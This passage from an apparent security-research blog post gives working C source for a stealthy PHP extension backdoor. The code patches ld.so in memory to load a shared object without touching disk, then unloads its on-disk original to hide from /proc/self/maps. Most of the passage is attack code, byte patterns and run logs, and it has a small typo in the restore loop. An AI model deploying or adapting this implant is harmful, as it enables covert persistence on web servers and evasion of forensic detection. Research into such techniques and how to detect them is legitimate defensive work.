   0x00007ffff7fcc275 <_dl_map_object_from_fd+1701>:    mov    rsi,rax
   0x00007ffff7fcc278 <_dl_map_object_from_fd+1704>:    mov    QWORD PTR [rbp-0x158],rax
   0x00007ffff7fcc27f <_dl_map_object_from_fd+1711>:    call   0x7ffff7fe9bb0 <__GI___pread64_nocancel>
*/
const char pread64_pattern[] = {0x48, 0x89, 0xc6, 0x48, 0x89, 0x85, 0xa8, 0xfe, 0xff, 0xff, 0xe8};
#define pread64_pattern_length 11

const char* patterns[] = {read_pattern, mmap_pattern, pread64_pattern, fxstat_pattern, close_pattern,
                          open_pattern, NULL};
const size_t pattern_lengths[] = {read_pattern_length, mmap_pattern_length, pread64_pattern_length, 
                                  fxstat_pattern_length, close_pattern_length, open_pattern_length, 0};
const char* symbols[] = {"read", "mmap", "pread", "fstat", "close", "open", NULL};
uint64_t functions[] = {(uint64_t)&my_read, (uint64_t)&my_mmap, (uint64_t)&my_pread64, (uint64_t)&my_fstat, 
                        (uint64_t)&my_close, (uint64_t)&my_open, 0}; 
char *fixes[7] = {0};

uint64_t fix_locations[7] = {0};
size_t page_size;


bool find_ld_in_memory(uint64_t *addr1, uint64_t *addr2) {
    FILE* f = NULL;
    char  buffer[1024] = {0};
    char* tmp = NULL;
    char* start = NULL;
    char* end = NULL;
    bool  found = false;

    if ((f = fopen("/proc/self/maps", "r")) == NULL){
        return found;
    }

    while ( fgets(buffer, sizeof(buffer), f) ){
        if ( strstr(buffer, "r-xp") == 0 ) {
            continue;
        }
        if ( strstr(buffer, "ld-linux-x86-64.so.2") == 0 ) {
            continue;        
        }

        buffer[strlen(buffer)-1] = 0;
        tmp = strrchr(buffer, ' ');
        if ( tmp == NULL || tmp[0] != ' ')
            continue;
        ++tmp;

        start = strtok(buffer, "-");
        *addr1 = strtoul(start, NULL, 16);
        end = strtok(NULL, " ");
        *addr2 = strtoul(end, NULL, 16);
        found = true;
    }
    fclose(f);
    return found;
}


/* hooks */

int my_open(const char *pathname, int flags) {
    void *handle;
    int (*mylegacyopen)(const char *pathnam, int flags);

    handle = dlopen (LIBC, RTLD_NOW);
    mylegacyopen = dlsym(handle, "open");
    if (strstr(pathname, "magic.so") != 0){
        printf("\t[+] Open called with magic word. Returning magic FD (0x69)\n");
        return 0x69;
    }
    return mylegacyopen(pathname, flags);
}

ssize_t my_read(int fd, void *buf, size_t count){
    void *handle;
    ssize_t (*mylegacyread)(int fd, void *buf, size_t count);

    handle = dlopen (LIBC, RTLD_NOW);
    mylegacyread = dlsym(handle, "read");
    if (fd == 0x69){
        size_t size = 0;
        if ( libdata.size - libdata.current >= count ) {
            size = count;
        } else {
            size = libdata.size - libdata.current;
        }
        memcpy(buf, libdata.data + libdata.current, size);
        libdata.current += size;
        printf("\t[+] Read called with magic FD. Returning %ld bytes from memory\n", size);
        return size;
    }
    size_t ret =  mylegacyread(fd, buf, count);
    printf("Size: %ld\n",ret);
    return ret;
}

void * my_mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset){
    int mflags = 0;
    void * ret = NULL;
    uint64_t start = 0;
    size_t size = 0;

    if ( fd == 0x69 ) {
        mflags = MAP_PRIVATE|MAP_ANON;
        if ( (flags & MAP_FIXED) != 0 ) {
            mflags |= MAP_FIXED;
        }
        ret = mmap(addr, length, PROT_READ|PROT_WRITE|PROT_EXEC, mflags, -1, 0);
        size = length > libdata.size - offset ? libdata.size - offset : length;
        memcpy(ret, libdata.data + offset, size);
        mprotect(ret, size, prot);
        if (first == 0){
            first = (uint64_t)ret;
        }
        printf("\t[+] Inside hooked mmap (fd: 0x%x)\n", fd);
        return ret;
    }
    return mmap(addr, length, prot, flags, fd, offset);
}


int my_fstat(int fd, struct stat *buf){
    void *handle;
    int (*mylegacyfstat)(int fd, struct stat *buf);


    handle = dlopen (LIBC, RTLD_NOW);
    mylegacyfstat = dlsym(handle, "fstat64");

    if ( fd == 0x69 ) {
        memset(buf, 0, sizeof(struct stat));
        buf->st_size = libdata.size;
        buf->st_ino = 0x666; // random number
        printf("\t[+] Inside hooked fstat64 (fd: 0x%x)\n", fd);
        return 0;
    }
    return mylegacyfstat(fd, buf);
}

int my_close(int fd) {
    if (fd == 0x69){
        printf("\t[+] Inside hooked close (fd: 0x%x)\n", fd);
        return 0;
    }
    return close(fd);
}

/* Patch ld.so */
bool search_and_patch(uint64_t start_addr, uint64_t end_addr, const char* pattern, const size_t length, const char* symbol, const uint64_t replacement_addr, int position) {

    bool     found = false;
    int32_t  offset = 0;
    uint64_t tmp_addr = 0;
    uint64_t symbol_addr = 0;
    char * code = NULL;
    void * page_addr = NULL;

    tmp_addr = start_addr;
    while ( ! found && tmp_addr+length < end_addr) {
        if ( memcmp((void*)tmp_addr, (void*)pattern, length) == 0 ) {
            found = true;
            continue;
        }
        ++tmp_addr;
    }

    if ( ! found ) {
        return false;
    }

    offset = *((uint64_t*)(tmp_addr + length));
    symbol_addr = tmp_addr + length + 4 + offset;

    //Save data to fix later
    fixes[position] = malloc(stub_length * sizeof(char));
    memcpy(fixes[position], (void*)symbol_addr, stub_length);
    fix_locations[position] = symbol_addr;
    printf("[*] Symbol: %s - Addr: %lx\n", symbol, fix_locations[position]);

    code = malloc(stub_length * sizeof(char));
    memcpy(code, stub, stub_length);
    memcpy(code+6, &replacement_addr, sizeof(uint64_t));

    page_addr = (void*) (((size_t)symbol_addr) & (((size_t)-1) ^ (page_size - 1)));
    mprotect(page_addr, page_size, PROT_READ | PROT_WRITE); 
    memcpy((void*)symbol_addr, code, stub_length);
    mprotect(page_addr, page_size, PROT_READ | PROT_EXEC); 
    return true;
}

/* Read file from disk */
bool load_library_from_file(char * path, lib_t *libdata) {
    struct stat st;
    FILE * file;
    size_t read;

    if ( stat(path, &st) < 0 ) {
        return false;
    }

    libdata->size = st.st_size;
    libdata->data = malloc( st.st_size );
    libdata->current = 0;

    file = fopen(path, "r");

    read = fread(libdata->data, 1, st.st_size, file);
    fclose(file);

    return true;
}


void patch_all(void){
    uint64_t start = 0;
    uint64_t end = 0;
    size_t i = 0;
    
    page_size = sysconf(_SC_PAGESIZE);
    printf("\t\t-=[ Proof of Concept ]=-\n\n");

    if (!load_library_from_file("/home/vagrant/research/php/backdoor/adepts/test.so", &libdata)){
        return;
    }
    if (!find_ld_in_memory(&start, &end)){
        return;
    }
    printf("[*] ld.so found in range [0x%lx-0x%lx]\n", start, end);
    printf("-------------[ Patching  ]-------------\n");
    while ( patterns[i] != NULL ) {
        if ( ! search_and_patch(start, end, patterns[i], pattern_lengths[i], symbols[i], functions[i], i) ) {     
            return;
        } 
        ++i;
    }
    printf("---------------------------------------\n");
    return;
}



// Basic zend_module_entry
zend_module_entry adepts_module_entry = {
    STANDARD_MODULE_HEADER,
    "adepts",                   /* Extension name */
    NULL,                   /* zend_function_entry */
    NULL,                           /* PHP_MINIT - Module initialization */
    NULL,                           /* PHP_MSHUTDOWN - Module shutdown */
    NULL,           /* PHP_RINIT - Request initialization */
    NULL,                           /* PHP_RSHUTDOWN - Request shutdown */
    NULL,           /* PHP_MINFO - Module info */
    PHP_ADEPTS_VERSION,     /* Version */
    STANDARD_MODULE_PROPERTIES
};

//Function "get_module" that will be executed by PHP
extern zend_module_entry *get_module(void){
    patch_all();
    void *handler = dlopen("./magic.so", RTLD_NOW); 
    //void *hanlder = dlopen("/home/vagrant/research/php/backdoor/adepts/test.so", RTLD_NOW);
    return &adepts_module_entry;
}



#ifdef COMPILE_DL_ADEPTS
# ifdef ZTS
ZEND_TSRMLS_CACHE_DEFINE()
# endif
ZEND_GET_MODULE(adepts)
#endif
```


We can test that the shared object (`test.so`) is loaded from memory instead of disk:

```bash
=> php  -d "extension=/home/vagrant/research/php/backdoor/adepts/adepts.so" -r "echo 1;"
        -=[ Proof of Concept ]=-

[*] ld.so found in range [0x7f0c1e953000-0x7f0c1e97d000]
-------------[ Patching  ]-------------
[*] Symbol: read - Addr: 7f0c1e977b80
[*] Symbol: mmap - Addr: 7f0c1e977cc0
[*] Symbol: pread - Addr: 7f0c1e977bb0
[*] Symbol: fstat - Addr: 7f0c1e9778a0
[*] Symbol: close - Addr: 7f0c1e9779f0
[*] Symbol: open - Addr: 7f0c1e977b00
---------------------------------------
    [+] Open called with magic word. Returning magic FD (0x69)
    [+] Read called with magic FD. Returning 832 bytes from memory
    [+] Inside hooked fstat64 (fd: 0x69)
    [+] Inside hooked mmap (fd: 0x69)
    [+] Inside hooked mmap (fd: 0x69)
    [+] Inside hooked mmap (fd: 0x69)
    [+] Inside hooked mmap (fd: 0x69)
    [+] Inside hooked close (fd: 0x69)
Lib initialized successfully!
1% 
```

Next question is... can we use it to load our extension **again** ? Let's add a small canary and change the path at `load_library_from_file()` to point to our extension:

```c
 static void check(void) __attribute__((constructor));
 void check(void){
     printf("~~~> Hello from adepts.o <~~~\n");
     return;
 }
```

It works!

```bash
=> php  -d "extension=/home/vagrant/research/php/backdoor/adepts/adepts.so" -r "echo 1;"
~~~> Hello from adepts.o <~~~
        -=[ Proof of Concept ]=-

[*] ld.so found in range [0x7fd97554c000-0x7fd975576000]
-------------[ Patching  ]-------------
[*] Symbol: read - Addr: 7fd975570b80
[*] Symbol: mmap - Addr: 7fd975570cc0
[*] Symbol: pread - Addr: 7fd975570bb0
[*] Symbol: fstat - Addr: 7fd9755708a0
[*] Symbol: close - Addr: 7fd9755709f0
[*] Symbol: open - Addr: 7fd975570b00
---------------------------------------
    [+] Open called with magic word. Returning magic FD (0x69)
    [+] Read called with magic FD. Returning 832 bytes from memory
    [+] Inside hooked fstat64 (fd: 0x69)
    [+] Inside hooked mmap (fd: 0x69)
    [+] Inside hooked mmap (fd: 0x69)
    [+] Inside hooked mmap (fd: 0x69)
    [+] Inside hooked mmap (fd: 0x69)
    [+] Inside hooked close (fd: 0x69)
~~~> Hello from adepts.o <~~~
```

We can see how the message was printed twice: the first when PHP loads our extension and the second when the extension is loaded directly from memory.

At this point every other shared object loaded by the process will go through our hooks. That's something that should be fine but to avoid any issue (imagine a collision between a file descriptor and our magic value) we have to repatch the memory to remove the hooks. The other reason to restore the original code is because we are kind and polite **:)**.

```c
 /* remove hooks */
 bool fix_hook(char *fix, uint64_t addr){
     void *page_addr = (void*) (((size_t)addr) & (((size_t)-1) ^ (page_size - 1)));
     mprotect(page_addr, page_size, PROT_READ | PROT_WRITE);
     memcpy((void *)addr, fix, stub_length);
     mprotect(page_addr, page_size, PROT_READ | PROT_EXEC);
     return true;
 }
 
 extern void restore(void){
     int i = 0;
     printf("[*] Fixing hooks\n");
     while ( patterns[i] != NULL ) {m
            if ( ! fix_hook(fixes[i], fix_locations[i]) ) {
                return;
            }
            ++i;
     }
     return;
 }
 ```

# The secret sauce

Although we have a new copy of our extension loaded from memory we can not unload the original because the symbols are binded.

```bash
    147212: binding file ./magic.so [0] to /home/vagrant/research/php/backdoor/adepts/adepts.so [0]: normal symbol `onLoad'
    147212: binding file ./magic.so [0] to /home/vagrant/research/php/backdoor/adepts/adepts.so [0]: normal symbol `stub_length'
    147212: binding file ./magic.so [0] to /home/vagrant/research/php/backdoor/adepts/adepts.so [0]: normal symbol `adepts_module_entry'
```

Even if we call multiple times `dlclose()` the process will keep always references to it, so it would not be unloaded. To solve this issue we have to compile the extension using the flag `-fvisibility=hidden` and only set `get_module` symbol to default visibility.


Now the question is... how can we unload the extension? how can we set the `MINIT/MSHUTDOWN/RINIT/RSHUTDOWN` hooks so our code will be executed? Well, the answer is the same: the original `get_module()` must return a pointer to a `zend_module_entry` located in the new copy loaded from memory. And also this structure must be set with pointers to functions in this copy. 

We need to have the code to execute the `dlclose()` pointed by `module_startup_func` so it would be executed when Zend Engine processes the data. The problem is we can not use `dlsym()` to find the function address because we set the visibility to hidden to avoid the symbol collision issue. Alternatively we can get the address in our original extension minus the base address, and then use the address of the first mapped region in our copied version plus this difference as an offset:

```c
    static Dl_info info;
    dladdr(&info, &info);
    uint64_t diffLoad = (uint64_t)&onLoad - (uint64_t)info.dli_fbase;
    uint64_t diffRequest = (uint64_t)&onRequest - (uint64_t)info.dli_fbase;
    uint64_t newLoad = first + diffLoad;
    uint64_t newRequest = first + diffRequest;

    uint64_t diffModule = (uint64_t)&adepts_module_entry - (uint64_t)info.dli_fbase;
    ((zend_module_entry *)(diffModule + first))->module_startup_func = (void *)newLoad;
    ((zend_module_entry *)(diffModule + first))->request_shutdown_func = (void *)newRequest;
    return (void *)(diffModule + first);
```

And the code at `newLoad()` and `newRequest()`:

```c
/* Functions to execute */
zend_result onLoad(int a, int b){
    printf("[^] Executing onLoad\n");
    void* handle = dlopen("/home/vagrant/research/php/backdoor/adepts/adepts.so", RTLD_LAZY);
    while (dlclose(handle) != -1){
        printf("[*] dlclose()\n");
    }
    return SUCCESS;
}
zend_result onRequest(void){
    php_printf("\n[/!\\] Adepts of 0xCC [/!\\]\n\n");
    return SUCCESS;
}
```

We can verify that it works:

```bash
=> sudo php  -d "extension=/home/vagrant/research/php/backdoor/adepts/adepts.so" -S 127.0.0.1:80
~~~> Hello from adepts.o <~~~
                -=[ Proof of Concept ]=-

[*] ld.so found in range [0x7f60980a7000-0x7f60980d1000]
-------------[ Patching  ]-------------
[*] Symbol: read - Addr: 7f60980cbb80
[*] Symbol: mmap - Addr: 7f60980cbcc0
[*] Symbol: pread - Addr: 7f60980cbbb0
[*] Symbol: fstat - Addr: 7f60980cb8a0
[*] Symbol: close - Addr: 7f60980cb9f0
[*] Symbol: open - Addr: 7f60980cbb00
---------------------------------------
        [+] Open called with magic word. Returning magic FD (0x69)
        [+] Read called with magic FD. Returning 832 bytes from memory
        [+] Inside hooked fstat64 (fd: 0x69)
        [+] Inside hooked mmap (fd: 0x69)
        [+] Inside hooked mmap (fd: 0x69)
        [+] Inside hooked mmap (fd: 0x69)
        [+] Inside hooked mmap (fd: 0x69)
        [+] Inside hooked close (fd: 0x69)
~~~> Hello from adepts.o <~~~
---------------------------------------
[*] Fixing hooks
[^] Executing onLoad
[*] dlclose()
[*] dlclose()
[Mon Dec 26 20:59:11 2022] PHP 8.2.0 Development Server (http://127.0.0.1:80) started
[Mon Dec 26 20:59:26 2022] 127.0.0.1:42582 Accepted
[Mon Dec 26 20:59:26 2022] 127.0.0.1:42582 [200]: GET /index.php
[Mon Dec 26 20:59:26 2022] 127.0.0.1:42582 Closing
```

And we can see that even when the original extension as unloaded, the copy version from memory still working:

```bash
=> curl localhost/index.php                                                                     
Hello World!

[/!\] Adepts of 0xCC [/!\]

```

If we change the `index.php` to check `/proc/self/maps` contents we can see how it's *"invisible"* (well, you can see the anomalous memory regions that should be enough to detect it):

```bash
=> curl localhost/index.php                                                                                                                                                                                                                                                  
561150c00000-561150d2c000 r--p 00000000 08:01 2523                       /usr/local/bin/php                                                                                                                                                                                         
561150e00000-56115161b000 r-xp 00200000 08:01 2523                       /usr/local/bin/php                                                                                                                                                                                         
561151800000-56115201c000 r--p 00c00000 08:01 2523                       /usr/local/bin/php                                                                                                                                                                                         
56115231d000-561152400000 r--p 0151d000 08:01 2523                       /usr/local/bin/php                                                                                                                                                                                         
561152400000-561152406000 rw-p 01600000 08:01 2523                       /usr/local/bin/php                                                                                                                                                                                         
561152406000-561152424000 rw-p 00000000 00:00 0                                                                                                                                                                                                                                     
561152a2e000-561152c26000 rw-p 00000000 00:00 0                          [heap]                                                                                                                                                                                                     
7f9f97f17000-7f9f98200000 r--p 00000000 08:01 6308                       /usr/lib/locale/locale-archive                                                                                                                                                                             
7f9f98200000-7f9f98400000 rw-p 00000000 00:00 0                                                                                                                                                                                                                                     
7f9f98490000-7f9f984e1000 rw-p 00000000 00:00 0                                                                                                                                                                                                                                     
7f9f9850a000-7f9f9853a000 rw-p 00000000 00:00 0                                                                                                                                                                                                                                     
7f9f9853a000-7f9f9853b000 r--p 00000000 00:00 0                                                                                                                                                                                                                                     
7f9f9853b000-7f9f9853d000 r-xp 00000000 00:00 0                                                                                                                                                                                                                                     
7f9f9853d000-7f9f9853f000 r--p 00000000 00:00 0                                                                                                                                                                                                                                     
7f9f9853f000-7f9f98540000 rw-p 00000000 00:00 0                                                                                                                                                                                                                                     
7f9f98540000-7f9f98597000 r--p 00000000 08:01 6312                       /usr/lib/locale/C.utf8/LC_CTYPE                                                                                                                                                                            
7f9f98597000-7f9f9859c000 rw-p 00000000 00:00 0                                                                                                                                                                                                                                     
7f9f9859c000-7f9f9859f000 r--p 00000000 08:01 3638                       /usr/lib/x86_64-linux-gnu/libgcc_s.so.1                                                                                                                                                                    
7f9f9859f000-7f9f985b6000 r-xp 00003000 08:01 3638                       /usr/lib/x86_64-linux-gnu/libgcc_s.so.1                                                                                                                                                                    
7f9f985b6000-7f9f985ba000 r--p 0001a000 08:01 3638                       /usr/lib/x86_64-linux-gnu/libgcc_s.so.1                                                                                                                                                                    
7f9f985ba000-7f9f985bb000 r--p 0001d000 08:01 3638                       /usr/lib/x86_64-linux-gnu/libgcc_s.so.1                                                                                                                                                                    
7f9f985bb000-7f9f985bc000 rw-p 0001e000 08:01 3638                       /usr/lib/x86_64-linux-gnu/libgcc_s.so.1                                                                                                                                                                    
7f9f985bc000-7f9f98656000 r--p 00000000 08:01 3639                       /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.30                                                                                                                                                              
7f9f98656000-7f9f98766000 r-xp 0009a000 08:01 3639                       /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.30                                                                                                                                                              
7f9f98766000-7f9f987d5000 r--p 001aa000 08:01 3639                       /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.30                                                                                                                                                              
7f9f987d5000-7f9f987e0000 r--p 00218000 08:01 3639                       /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.30                                                                                                                                                              
7f9f987e0000-7f9f987e3000 rw-p 00223000 08:01 3639                       /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.30                                                                                                                                                              
7f9f987e3000-7f9f987e6000 rw-p 00000000 00:00 0                                                                                                                                                                                                                                     
7f9f987e6000-7f9f987e7000 r--p 00000000 08:01 4871                       /usr/lib/x86_64-linux-gnu/libicudata.so.70.1                                                                                                                                                               
7f9f987e7000-7f9f987e8000 r-xp 00001000 08:01 4871                       /usr/lib/x86_64-linux-gnu/libicudata.so.70.1                                                                                                                                                               
7f9f987e8000-7f9f9a402000 r--p 00002000 08:01 4871                       /usr/lib/x86_64-linux-gnu/libicudata.so.70.1                                                                                                                                                               
7f9f9a402000-7f9f9a403000 r--p 01c1b000 08:01 4871                       /usr/lib/x86_64-linux-gnu/libicudata.so.70.1
7f9f9a403000-7f9f9a404000 rw-p 01c1c000 08:01 4871                       /usr/lib/x86_64-linux-gnu/libicudata.so.70.1                                                                                                                                                         [0/39]
7f9f9a404000-7f9f9a406000 rw-p 00000000 00:00 0                      
7f9f9a406000-7f9f9a409000 r--p 00000000 08:01 3968                       /usr/lib/x86_64-linux-gnu/liblzma.so.5.2.5                       
7f9f9a409000-7f9f9a424000 r-xp 00003000 08:01 3968                       /usr/lib/x86_64-linux-gnu/liblzma.so.5.2.5                       
7f9f9a424000-7f9f9a42f000 r--p 0001e000 08:01 3968                       /usr/lib/x86_64-linux-gnu/liblzma.so.5.2.5                       
7f9f9a42f000-7f9f9a430000 r--p 00028000 08:01 3968                       /usr/lib/x86_64-linux-gnu/liblzma.so.5.2.5                       
7f9f9a430000-7f9f9a431000 rw-p 00029000 08:01 3968                       /usr/lib/x86_64-linux-gnu/liblzma.so.5.2.5                       
7f9f9a431000-7f9f9a433000 r--p 00000000 08:01 4818                       /usr/lib/x86_64-linux-gnu/libz.so.1.2.11                         
7f9f9a433000-7f9f9a444000 r-xp 00002000 08:01 4818                       /usr/lib/x86_64-linux-gnu/libz.so.1.2.11                         
7f9f9a444000-7f9f9a44a000 r--p 00013000 08:01 4818                       /usr/lib/x86_64-linux-gnu/libz.so.1.2.11                         
7f9f9a44a000-7f9f9a44b000 ---p 00019000 08:01 4818                       /usr/lib/x86_64-linux-gnu/libz.so.1.2.11                         
7f9f9a44b000-7f9f9a44c000 r--p 00019000 08:01 4818                       /usr/lib/x86_64-linux-gnu/libz.so.1.2.11                         
7f9f9a44c000-7f9f9a44d000 rw-p 0001a000 08:01 4818                       /usr/lib/x86_64-linux-gnu/libz.so.1.2.11                         
7f9f9a44d000-7f9f9a4b3000 r--p 00000000 08:01 4876                       /usr/lib/x86_64-linux-gnu/libicuuc.so.70.1                       
7f9f9a4b3000-7f9f9a5a6000 r-xp 00066000 08:01 4876                       /usr/lib/x86_64-linux-gnu/libicuuc.so.70.1                       
7f9f9a5a6000-7f9f9a632000 r--p 00159000 08:01 4876                       /usr/lib/x86_64-linux-gnu/libicuuc.so.70.1                       
7f9f9a632000-7f9f9a645000 r--p 001e4000 08:01 4876                       /usr/lib/x86_64-linux-gnu/libicuuc.so.70.1                       
7f9f9a645000-7f9f9a646000 rw-p 001f7000 08:01 4876                       /usr/lib/x86_64-linux-gnu/libicuuc.so.70.1                       
7f9f9a646000-7f9f9a648000 rw-p 00000000 00:00 0                      
7f9f9a648000-7f9f9a670000 r--p 00000000 08:01 3644                       /usr/lib/x86_64-linux-gnu/libc.so.6                              
7f9f9a670000-7f9f9a805000 r-xp 00028000 08:01 3644                       /usr/lib/x86_64-linux-gnu/libc.so.6                              
7f9f9a805000-7f9f9a85d000 r--p 001bd000 08:01 3644                       /usr/lib/x86_64-linux-gnu/libc.so.6                              
7f9f9a85d000-7f9f9a861000 r--p 00214000 08:01 3644                       /usr/lib/x86_64-linux-gnu/libc.so.6                              
7f9f9a861000-7f9f9a863000 rw-p 00218000 08:01 3644                       /usr/lib/x86_64-linux-gnu/libc.so.6                              
7f9f9a863000-7f9f9a870000 rw-p 00000000 00:00 0                      
7f9f9a870000-7f9f9a89f000 r--p 00000000 08:01 2255                       /usr/lib/x86_64-linux-gnu/libxml2.so.2.9.13                      
7f9f9a89f000-7f9f9a9f2000 r-xp 0002f000 08:01 2255                       /usr/lib/x86_64-linux-gnu/libxml2.so.2.9.13                      
7f9f9a9f2000-7f9f9aa46000 r--p 00182000 08:01 2255                       /usr/lib/x86_64-linux-gnu/libxml2.so.2.9.13                      
7f9f9aa46000-7f9f9aa47000 ---p 001d6000 08:01 2255                       /usr/lib/x86_64-linux-gnu/libxml2.so.2.9.13                      
7f9f9aa47000-7f9f9aa50000 r--p 001d6000 08:01 2255                       /usr/lib/x86_64-linux-gnu/libxml2.so.2.9.13                      
7f9f9aa50000-7f9f9aa51000 rw-p 001df000 08:01 2255                       /usr/lib/x86_64-linux-gnu/libxml2.so.2.9.13                      
7f9f9aa51000-7f9f9aa52000 rw-p 00000000 00:00 0                      
7f9f9aa52000-7f9f9aa60000 r--p 00000000 08:01 3647                       /usr/lib/x86_64-linux-gnu/libm.so.6                              
7f9f9aa60000-7f9f9aadc000 r-xp 0000e000 08:01 3647                       /usr/lib/x86_64-linux-gnu/libm.so.6                              
7f9f9aadc000-7f9f9ab37000 r--p 0008a000 08:01 3647                       /usr/lib/x86_64-linux-gnu/libm.so.6                              
7f9f9ab37000-7f9f9ab38000 r--p 000e4000 08:01 3647                       /usr/lib/x86_64-linux-gnu/libm.so.6                              
7f9f9ab38000-7f9f9ab39000 rw-p 000e5000 08:01 3647                       /usr/lib/x86_64-linux-gnu/libm.so.6                              
7f9f9ab43000-7f9f9ab4a000 r--s 00000000 08:01 3960                       /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache              
7f9f9ab4a000-7f9f9ab4c000 rw-p 00000000 00:00 0                      
7f9f9ab4c000-7f9f9ab4e000 r--p 00000000 08:01 3641                       /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2                   
7f9f9ab4e000-7f9f9ab72000 r-xp 00002000 08:01 3641                       /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2                   
7f9f9ab72000-7f9f9ab73000 r-xp 00026000 08:01 3641                       /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2                   
7f9f9ab73000-7f9f9ab78000 r-xp 00027000 08:01 3641                       /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2                   
7f9f9ab78000-7f9f9ab83000 r--p 0002c000 08:01 3641                       /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2                   
7f9f9ab84000-7f9f9ab86000 r--p 00037000 08:01 3641                       /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2                   
7f9f9ab86000-7f9f9ab88000 rw-p 00039000 08:01 3641                       /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2                   
7ffd2886b000-7ffd2888c000 rw-p 00000000 00:00 0                          [stack]                                                          
7ffd2897b000-7ffd2897f000 r--p 00000000 00:00 0                          [vvar]                                                           
7ffd2897f000-7ffd28981000 r-xp 00000000 00:00 0                          [vdso]                                                           
ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall
```

# All together

The final code is:

```c
/* adepts extension for PHP */

#ifdef HAVE_CONFIG_H
# include "config.h"
#endif

#include "php.h"
#include "ext/standard/info.h"
#include "php_adepts.h"

#include <sys/mman.h>
#include <pthread.h>


/* For compatibility with older PHP versions */
#ifndef ZEND_PARSE_PARAMETERS_NONE
#define ZEND_PARSE_PARAMETERS_NONE() \
    ZEND_PARSE_PARAMETERS_START(0, 0) \
    ZEND_PARSE_PARAMETERS_END()
#endif




typedef struct {
    void * data;
    size_t size;
    size_t current;
} lib_t;

lib_t libdata;


char stub[] = {0x55, 0x48, 0x89, 0xe5, 0x48, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0, 0xff, 0xd0, 0xc9, 0xc3};
size_t stub_length = 18;

#define LIBC "/lib/x86_64-linux-gnu/libc.so.6"


int     my_open(const char *pathname, int flags); 
off_t   my_pread64(int fd, void *buf, size_t count, off_t offset);
ssize_t my_read(int fd, void *buf, size_t count);
void *  my_mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
int     my_fstat(int fd, struct stat *buf);
int     my_close(int fd);


/*
pwndbg> disassemble 0x7ffff7fc99ad,+20
Dump of assembler code from 0x7ffff7fc99ad to 0x7ffff7fc99c1:
   0x00007ffff7fc99ad <open_verify+109>:    sub    rdx,rax
   0x00007ffff7fc99b0 <open_verify+112>:    lea    rsi,[rdi+rax*1]
   0x00007ffff7fc99b4 <open_verify+116>:    mov    edi,r15d
   0x00007ffff7fc99b7 <open_verify+119>:    call   0x7ffff7fe9b80 <__GI___read_nocancel>

*/
const char read_pattern[] = {0x48, 0x29, 0xc2, 0x48,  0x8d, 0x34,  0x07, 0x44, 0x89, 0xff, 0xe8};
#define read_pattern_length 11

/*
pwndbg> disass 0x7ffff7fcc088,+40
Dump of assembler code from 0x7ffff7fcc088 to 0x7ffff7fcc0b0:
   0x00007ffff7fcc088 <_dl_map_object_from_fd+1208>:    mov    ecx,0x812
   0x00007ffff7fcc08d <_dl_map_object_from_fd+1213>:    mov    DWORD PTR [rbp-0xe0],r11d
   0x00007ffff7fcc094 <_dl_map_object_from_fd+1220>:    call   0x7ffff7fe9cc0 <__mmap64>
*/
const char mmap_pattern[] = {0xb9, 0x12, 0x08, 0x00, 0x00, 0x44, 0x89, 0x9d, 0x20, 0xff, 0xff, 0xff, 0xe8};
#define mmap_pattern_length 13

/*
pwndbg> disass 0x7ffff7fcc0c8,+20
Dump of assembler code from 0x7ffff7fcc0c8 to 0x7ffff7fcc0dc:
   0x00007ffff7fcc0c8 <_dl_map_object_from_fd+1272>:    mov    edi,DWORD PTR [rbp-0xd4]
   0x00007ffff7fcc0ce <_dl_map_object_from_fd+1278>:    lea    rsi,[rbp-0xc0]
   0x00007ffff7fcc0d5 <_dl_map_object_from_fd+1285>:    call   0x7ffff7fe98a0 <__GI___fstat64>
   */
const char fxstat_pattern[] = {0x8b, 0xbd, 0x2c, 0xff, 0xff, 0xff, 0x48, 0x8d, 0xb5, 0x40, 0xff, 0xff, 0xff, 0xe8};
#define fxstat_pattern_length 14

/*
pwndbg> disass 0x7ffff7fcc145,+40
Dump of assembler code from 0x7ffff7fcc145 to 0x7ffff7fcc16d:
   0x00007ffff7fcc145 <_dl_map_object_from_fd+1397>:    mov    edi,DWORD PTR [rbp-0xd4]
   0x00007ffff7fcc14b <_dl_map_object_from_fd+1403>:    call   0x7ffff7fe99f0 <__GI___close_nocancel>
*/
const char close_pattern[] = {0x8b, 0xbd, 0x2c, 0xff, 0xff, 0xff, 0xe8};
#define close_pattern_length 7

/*
pwndbg> disass 0x7ffff7fc996a,+40
Dump of assembler code from 0x7ffff7fc996a to 0x7ffff7fc9992:
   0x00007ffff7fc996a <open_verify+42>: mov    esi,0x80000
   0x00007ffff7fc996f <open_verify+47>: mov    rdi,r14
   0x00007ffff7fc9972 <open_verify+50>: xor    eax,eax
   0x00007ffff7fc9974 <open_verify+52>: call   0x7ffff7fe9b00 <__GI___open64_nocancel>
*/
const char open_pattern[] = {0xbe, 0x00, 0x00, 0x08, 0x00, 0x4c, 0x89, 0xf7, 0x31, 0xc0, 0xe8};
#define open_pattern_length 11

/*
pwndbg> disass 0x00007ffff7fcc275,+40
Dump of assembler code from 0x7ffff7fcc275 to 0x7ffff7fcc29d:
   0x00007ffff7fcc275 <_dl_map_object_from_fd+1701>:    mov    rsi,rax
   0x00007ffff7fcc278 <_dl_map_object_from_fd+1704>:    mov    QWORD PTR [rbp-0x158],rax
   0x00007ffff7fcc27f <_dl_map_object_from_fd+1711>:    call   0x7ffff7fe9bb0 <__GI___pread64_nocancel>
*/
const char pread64_pattern[] = {0x48, 0x89, 0xc6, 0x48, 0x89, 0x85, 0xa8, 0xfe, 0xff, 0xff, 0xe8};
#define pread64_pattern_length 11

const char* patterns[] = {read_pattern, mmap_pattern, pread64_pattern, fxstat_pattern, close_pattern,
                          open_pattern, NULL};
